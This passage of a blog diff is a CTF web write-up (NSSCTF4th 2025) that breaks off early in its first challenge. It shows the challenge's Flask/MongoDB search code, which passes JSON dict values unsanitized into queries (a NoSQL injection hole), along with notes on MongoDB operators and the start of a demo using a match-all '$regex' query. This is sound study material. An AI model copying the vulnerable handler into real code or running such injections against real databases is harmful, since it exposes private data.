@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>NSSCTF4th 2025 Web Writeup - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="NSSCTF4th 2025 Web Writeup"><meta name="keywords" content='CTF'>
+  <meta itemprop="name" content="NSSCTF4th 2025 Web Writeup">
+  <meta itemprop="description" content="NSSCTF4th 2025 Web Writeup">
+  <meta itemprop="datePublished" content="2025-08-24T23:40:38+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:34:21+08:00">
+  <meta itemprop="wordCount" content="1429">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="CTF"><meta property="og:url" content="https://sw1mblu3.fun/posts/nssctf4th-2025-web-writeup/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="NSSCTF4th 2025 Web Writeup">
+  <meta property="og:description" content="NSSCTF4th 2025 Web Writeup">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-24T23:40:38+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:34:21+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="NSSCTF4th 2025 Web Writeup" /><meta name="twitter:description" content="NSSCTF4th 2025 Web Writeup" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/nssctf4th-2025-web-writeup/" title="NSSCTF4th 2025 Web Writeup - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/%E5%AE%81%E6%B3%A2%E8%B5%9B-2025-web-writeup/" title="天一永安杯 2025 Web Writeup" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/lilctf-2025-web-writeup/" title="LILCTF 2025 Web Writeup" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/nssctf4th-2025-web-writeup/index.md" title="NSSCTF4th 2025 Web Writeup - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "NSSCTF4th 2025 Web Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/nssctf4th-2025-web-writeup\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "CTF","wordcount":  1429 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/nssctf4th-2025-web-writeup\/","datePublished": "2025-08-24T23:40:38+00:00","dateModified": "2026-07-09T18:34:21+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>NSSCTF4th 2025 Web Writeup</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-08-24T23:40:38Z">24 Aug, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#ez_signin"><code>ez_signin</code></a></li>
+        <li><a href="#ezcrc"><code>EzCRC</code></a></li>
+        <li><a href="#mpgafilesystem"><code>[mpga]filesystem</code></a></li>
+        <li><a href="#ez_upload">ez_upload</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p><figure>
+  <img src="file-20250824162306332.png" alt="" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="ez_signin"><span><code>ez_signin</code></span>
+  <a href="#ez_signin" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">jsonify</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pymongo</span> <span class="kn">import</span> <span class="n">MongoClient</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">client</span> <span class="o">=</span> <span class="n">MongoClient</span><span class="p">(</span><span class="s2">&#34;mongodb://localhost:27017/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">db</span> <span class="o">=</span> <span class="n">client</span><span class="p">[</span><span class="s1">&#39;aggie_bookstore&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">books_collection</span> <span class="o">=</span> <span class="n">db</span><span class="p">[</span><span class="s1">&#39;books&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sanitize</span><span class="p">(</span><span class="n">input_str</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[^a-zA-Z0-9\s]&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">input_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">books</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">search</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">query</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;$and&#34;</span><span class="p">:</span> <span class="p">[]}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">books</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;author&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">title_clean</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">author_clean</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">author</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">title_clean</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;$eq&#34;</span><span class="p">:</span> <span class="n">title_clean</span><span class="p">}})</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">author_clean</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;author&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;$eq&#34;</span><span class="p">:</span> <span class="n">author_clean</span><span class="p">}})</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">books</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">books_collection</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">books</span><span class="o">=</span><span class="n">books</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">content_type</span> <span class="o">==</span> <span class="s1">&#39;application/json&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">(</span><span class="n">force</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">title</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;title&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">author</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;author&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">title</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="n">title</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="n">title</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">author</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">author</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;author&#34;</span><span class="p">:</span> <span class="n">author</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">                <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&#34;author&#34;</span><span class="p">:</span> <span class="n">author</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">query</span><span class="p">[</span><span class="s2">&#34;$and&#34;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">books</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">books_collection</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">{</span><span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="n">b</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;title&#34;</span><span class="p">),</span> <span class="s2">&#34;author&#34;</span><span class="p">:</span> <span class="n">b</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;author&#34;</span><span class="p">),</span> <span class="s2">&#34;description&#34;</span><span class="p">:</span> <span class="n">b</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;description&#34;</span><span class="p">)}</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">books</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Empty query&#34;</span><span class="p">}),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)}),</span> <span class="mi">500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Unsupported Content-Type&#34;</span><span class="p">}),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="mi">8000</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>MongoDB，非常典型的 NOSQL 产品，再次之前没有 nosql 注入经验，借这个机会直接初步学习一下，这里主要学习 Python 操作 Mongodb
+<code>sudo docker pull mongo:latest</code>
+<figure>
+  <img src="file-20250824203405629.png" alt="" loading="lazy"></figure>
+
+进入容器，切换 mongodb
+<figure>
+  <img src="file-20250824213246494.png" alt="" loading="lazy"></figure>
+
+放一些测试数据
+<figure>
+  <img src="file-20250824224632909.png" alt="" loading="lazy"></figure>
+
+了解一下操作符</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$and</span>：与（数组形式，省略时对象多键即隐式 AND）
+</span></span><span class="line"><span class="cl"><span class="nv">$or</span>：或
+</span></span><span class="line"><span class="cl"><span class="nv">$nor</span>：NOR（全部子表达式都不匹配才返回）
+</span></span><span class="line"><span class="cl"><span class="nv">$not</span>：对单个表达式取反（常用于和 <span class="nv">$regex</span>、比较运算符合用
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$eq</span> 等于
+</span></span><span class="line"><span class="cl"><span class="nv">$ne</span> 不等于（注意选择性差，容易全表扫）
+</span></span><span class="line"><span class="cl"><span class="nv">$gt</span> 大于
+</span></span><span class="line"><span class="cl"><span class="nv">$gte</span> 大于等于
+</span></span><span class="line"><span class="cl"><span class="nv">$lt</span> 小于
+</span></span><span class="line"><span class="cl"><span class="nv">$lte</span> 小于等于
+</span></span><span class="line"><span class="cl"><span class="nv">$in</span> 包含于（右侧数组）
+</span></span><span class="line"><span class="cl"><span class="nv">$nin</span> 不包含于（右侧数组）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$exists</span>：字段是否存在（true/false）
+</span></span><span class="line"><span class="cl"><span class="nv">$type</span>：字段 BSON 类型匹配（支持别名/类型码，如 <span class="s2">&#34;string&#34;</span>, 2）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$expr</span>：在查询里用聚合表达式；可做字段间比较
+</span></span><span class="line"><span class="cl"><span class="nv">$mod</span>：整数取模匹配
+</span></span><span class="line"><span class="cl"><span class="nv">$regex</span>：正则匹配（配合 <span class="nv">$options</span>: <span class="s1">&#39;i&#39;</span> 等）
+</span></span><span class="line"><span class="cl"><span class="nv">$text</span>：全文索引搜索（需要先建 text 索引）
+</span></span><span class="line"><span class="cl"><span class="nv">$where</span>：JS 表达式（高风险+低性能，生产禁用）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$all</span>：数组包含全部给定元素（可与 <span class="nv">$elemMatch</span> 嵌套）
+</span></span><span class="line"><span class="cl"><span class="nv">$elemMatch</span>：数组中有至少一个元素同时满足多条件
+</span></span><span class="line"><span class="cl"><span class="nv">$size</span>：数组长度等于给定值（不能用索引）</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>写一个测试 demo</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">from pymongo import MongoClient
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">client = MongoClient(&#34;mongodb://localhost:27017/&#34;)  # 连接 mongodb
+</span></span><span class="line"><span class="cl">db = client[&#39;users&#39;]  #获取数据库
+</span></span><span class="line"><span class="cl">print(db)
+</span></span><span class="line"><span class="cl">books_collection = db[&#39;users&#39;]
+</span></span><span class="line"><span class="cl">print(books_collection)
+</span></span><span class="line"><span class="cl">book1 = list(books_collection.find({&#39;username&#39;:&#39;admin&#39;}))
+</span></span><span class="line"><span class="cl">print(book1)
+</span></span><span class="line"><span class="cl">book2 = list(books_collection.find({&#34;username&#34;:{&#34;$regex&#34;: &#39;.*&#39;}}))
